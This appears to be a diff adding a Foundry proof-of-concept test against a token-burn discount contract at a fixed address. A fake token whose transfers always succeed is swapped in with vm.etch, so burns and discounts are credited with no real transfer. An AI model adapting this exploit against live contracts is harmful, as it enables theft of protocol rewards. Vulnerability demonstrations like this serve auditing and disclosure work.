@@ -1,0 +1,65 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IMultiTokenBurnPortal {
+    struct Discount {
+        uint16 discount;
+        uint112 burnAmount;
+    }
+
+    function burnTokens(address token, uint256 amount) external;
+    function getPersonalDiscount(address account, address token) external view returns (uint256);
+    function burnedAmount(address, address) external view returns (uint256);
+    function getActiveTokens() external view returns (address[] memory);
+    function getDiscounts(address token) external view returns (Discount[] memory);
+}
+
+interface IERC20 {
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+}
+
+contract MaliciousToken is IERC20 {
+    function totalSupply() external pure returns (uint256) { return type(uint256).max; }
+    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }
+    function transfer(address, uint256) external pure returns (bool) { return true; }
+    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
+    function approve(address, uint256) external pure returns (bool) { return true; }
+    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
+}
+
+contract ExploitTest is Test {
+    address constant PORTAL = 0x10025F952Fd3dac40d52f09F58afC3bAaB4c2556;
+
+    function testExploit() public {
+        IMultiTokenBurnPortal portal = IMultiTokenBurnPortal(PORTAL);
+        address[] memory activeTokens = portal.getActiveTokens();
+        require(activeTokens.length > 0, "No active tokens");
+        address targetToken = activeTokens[0];
+
+        IMultiTokenBurnPortal.Discount[] memory discounts = portal.getDiscounts(targetToken);
+        require(discounts.length > 0, "Token has no discounts");
+
+        // Replace the token's code with a malicious one that always returns success
+        MaliciousToken mal = new MaliciousToken();
+        vm.etch(targetToken, address(mal).code);
+
+        address attacker = address(0xdeadbeef);
+        vm.startPrank(attacker);
+        // malicious token's transferFrom will return true even if no real transfer happens
+        portal.burnTokens(targetToken, 1e18);
+        vm.stopPrank();
+
+        uint256 burned = portal.burnedAmount(attacker, targetToken);
+        assertEq(burned, 1e18, "burnedAmount should be increased without actual token transfer");
+
+        uint256 personalDiscount = portal.getPersonalDiscount(attacker, targetToken);
+        assertGt(personalDiscount, 0, "Attacker should receive a discount without burning tokens");
+    }
+}
+```
